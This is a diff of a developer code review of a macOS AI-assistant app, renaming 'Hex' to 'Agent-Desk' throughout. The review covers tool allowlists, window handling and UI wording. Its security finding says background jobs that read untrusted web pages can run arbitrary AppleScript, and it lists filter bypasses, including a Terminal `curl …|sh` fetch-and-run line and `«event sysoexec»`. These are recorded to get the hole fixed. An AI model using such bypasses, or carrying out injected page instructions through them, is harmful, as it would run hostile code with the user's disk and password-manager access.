@@ -6,7 +6,7 @@ PR #58 (`hex_app_capabilities`, recipes removed) merged while I was reviewing, s
 
 1. **Security: a job can run any code outside its sandbox through `hex_app_action`.**
    - Files: `src/assistant/actions/app_action.rs:95-118`, `src/assistant/guard/proxy/actions.rs:23-100`
-   - Problem: Background jobs read untrusted pages and still get this tool. `script` is wrapped in `tell application id "X" … end tell` and runs as Hex itself, with Hex's Automation and Full Disk Access. The only filter is the substring `do shell script`. These all pass it:
+   - Problem: Background jobs read untrusted pages and still get this tool. `script` is wrapped in `tell application id "X" … end tell` and runs as Agent-Desk itself, with Agent-Desk's Automation and Full Disk Access. The only filter is the substring `do shell script`. These all pass it:
      - `tell application id "com.apple.Terminal" to do script "curl …|sh"`
      - an `end tell` followed by `tell application "1Password"` (the blocked-apps check only looks at `recipe.app`)
      - `«event sysoexec»`
@@ -35,8 +35,8 @@ PR #58 (`hex_app_capabilities`, recipes removed) merged while I was reviewing, s
    - Why it matters: on those backends the model is told to call tools it doesn't have, so "everything possible" fails silently.
    - Fix: build the allowlist from `Guard::tools()` / `policy::kind` (everything not `Refused` or withheld) instead of a hand list. Add a test that every `hex_*` name in `system_for` output is in each backend's allowed set.
 
-4. **Parked windows are stranded after Hex quits, crashes, or updates.**
-   - Files: `src/assistant/guard/state.rs:218` (`sweep`), `src/assistant/guard/desk.rs` (desk leases held by Hex's pid), `src/assistant/space.rs:38,137-170`, `src/assistant/guard/proxy/displays.rs:38-80,198`
+4. **Parked windows are stranded after Agent-Desk quits, crashes, or updates.**
+   - Files: `src/assistant/guard/state.rs:218` (`sweep`), `src/assistant/guard/desk.rs` (desk leases held by Agent-Desk's pid), `src/assistant/space.rs:38,137-170`, `src/assistant/guard/proxy/displays.rs:38-80,198`
    - Problem:
      - The guard parks windows in a screen corner from its own process, and remembers nothing.
      - `space::show_now` (overlay process) only knows positions it parked itself, so it falls back to main display +80,+80.
@@ -72,9 +72,9 @@ PR #58 (`hex_app_capabilities`, recipes removed) merged while I was reviewing, s
 ## P1: important
 
 8. **Lane tool inventory: overlaps and dead weight.**
-   - Sources: guard tools `guard/proxy.rs:242-277` (agent-desktop's list, plus Hex tools from `proxy/apps.rs:387`, `proxy/desk.rs:140`, `proxy/actions.rs`, `proxy/displays.rs:154`); Hex tools `tools.rs:147-218`; knowledge `knowledge.rs:114`, `knowledge/tab.rs:28`; browser via agent-browser + `browser/sessions.rs:435`; built-ins `provider/claude_code.rs:153,277`.
+   - Sources: guard tools `guard/proxy.rs:242-277` (agent-desktop's list, plus Agent-Desk tools from `proxy/apps.rs:387`, `proxy/desk.rs:140`, `proxy/actions.rs`, `proxy/displays.rs:154`); Agent-Desk tools `tools.rs:147-218`; knowledge `knowledge.rs:114`, `knowledge/tab.rs:28`; browser via agent-browser + `browser/sessions.rs:435`; built-ins `provider/claude_code.rs:153,277`.
 
-   | Lane | Desktop (guard) | Hex tools | Browser | Built-in |
+   | Lane | Desktop (guard) | Agent-Desk tools | Browser | Built-in |
    |---|---|---|---|---|
    | Here, full control (default) | `desktop_*` without `desktop_launch`; physical and clipboard tools allowed; `desktop_claim_window`, `hex_installed_apps`, `hex_open_app`, `hex_displays`, `hex_release_window`, `hex_app_action`, `hex_app_capabilities`, `hex_read_window` | `hex_start_jobs`, `hex_tell_job`, `hex_job_result`, `hex_remember`, `hex_schedule(s)`, `hex_unschedule`, `hex_compare_images`, `hex_lookup`, `hex_chrome_tab` | `agent_browser_*` | WebSearch, WebFetch |
    | Here, full control off | as above, but no claim, `hex_open_app`, release, or `hex_app_action` | same as above | none | same |
@@ -159,7 +159,7 @@ PR #58 (`hex_app_capabilities`, recipes removed) merged while I was reviewing, s
 18. **Wrong names in error messages and the UI.**
     - Files: `agent.rs:881`, `provider.rs:525`, `provider/claude_api.rs:31` ("Chats › Settings"); `service.rs:967` ("Settings › Assistant"); `rune_ui/sidebar.rs:129-146` (the panes are titled "Assistant" and "Assistant settings"); "Open in Chats" in `bubble.rs:324`, `live_card.rs:98`, `notify.rs:166`; "Chats…" in `macos_rune/status_item.rs:259`, `desktop/tray_menu.rs:209`
     - Problem: the errors send people to a page that doesn't exist by that name.
-    - Fix: one constant per destination (`"Assistant"`, `"Assistant settings"`) used by every message, menu, and button. Rename "Open in Chats" to "Open in Hex" or "Show in Assistant". Update the i18n keys.
+    - Fix: one constant per destination (`"Assistant"`, `"Assistant settings"`) used by every message, menu, and button. Rename "Open in Chats" to "Open in Agent-Desk" or "Show in Assistant". Update the i18n keys.
 
 19. **Mixed German and English, and ad-hoc translation.**
     - Files: 17 `said_in_german` branches (e.g. `service.rs:1123-1127`), `service/context.rs:261-268` (its own German word list for `on_it`), `service/status.rs:229`. German i18n alternates "Aufgabe" and "Auftrag" ("Neue Hintergrundaufgabe" vs "Auftrag im Hintergrund", "{} Aufträge laufen").
@@ -243,7 +243,7 @@ PR #58 (`hex_app_capabilities`, recipes removed) merged while I was reviewing, s
     - `#[allow(dead_code)]` on the wired `set_toggle_tasks`/`set_open_setup` (`shortcut.rs:58,86`)
     - the `cursor.rs:58` hotspot
     - orphaned "Agent mode" i18n entries (`desktop/i18n/assistant.rs:63,69,137,173`, `i18n.rs:576`)
-    - `macos_rune/control.rs:600` telling people to use "Labs › … `hex labs on print-start`" (Labs is gone)
+    - `macos_rune/control.rs:600` telling people to use "Labs › … `agent-desk labs on print-start`" (Labs is gone)
     - `allow_without_lab`/`WITHOUT_LAB` (`service.rs:386-390`) and `(lab, settings)` (`space.rs:44`)
     - `host.rs:110` "Chats isn't wired yet"
     - Fix: delete or rename in one sweep.
